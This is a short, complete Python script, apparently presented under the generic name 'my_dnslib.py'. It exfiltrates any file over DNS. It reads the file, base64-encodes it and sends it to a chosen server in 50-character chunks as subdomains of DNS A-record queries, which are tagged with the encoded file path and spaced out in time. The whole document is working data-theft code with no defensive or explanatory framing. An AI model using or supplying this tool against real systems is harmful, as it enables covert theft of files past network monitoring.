#!/usr/bin/env python

import sys
import time
import random
import base64
import dns.query
import dns.message

if len(sys.argv) != 4:
  print("Usage: my_dnslib.py <file_path> <server_address> <qname>")
  sys.exit(1)


file_path = sys.argv[1]
server_address = sys.argv[2]
qname = sys.argv[3]

PREFIX_NUMBER = random.randint(0, 1000)
BASE64_FILEPATH = base64.b64encode(file_path.encode()).decode()


def read_file_as_hex(file_path):
  with open(file_path, 'rb') as file:
    content = file.read()
  return content.hex()


def convert_hex_to_base64(hex_str):
  bytes_data = bytes.fromhex(hex_str)
  base64_encoded = base64.b64encode(bytes_data)
  return base64_encoded.decode()


def process_in_chunks(data, chunk_size):
  for i in range(0, len(data), chunk_size):
    yield data[i:i+chunk_size]


def send_dns_request(sub_domain):
  query = dns.message.make_query(f"{PREFIX_NUMBER}_{BASE64_FILEPATH}.{sub_domain}." + qname, 'A')

  try:
    dns.query.udp(query, server_address)
    print(sub_domain)
  except Exception as e:
    print(f"Error: {e}")


hex_data = read_file_as_hex(file_path)
base64_data = convert_hex_to_base64(hex_data)
for chunk in process_in_chunks(base64_data, 50):
  send_dns_request(chunk)
  time.sleep(0.1)
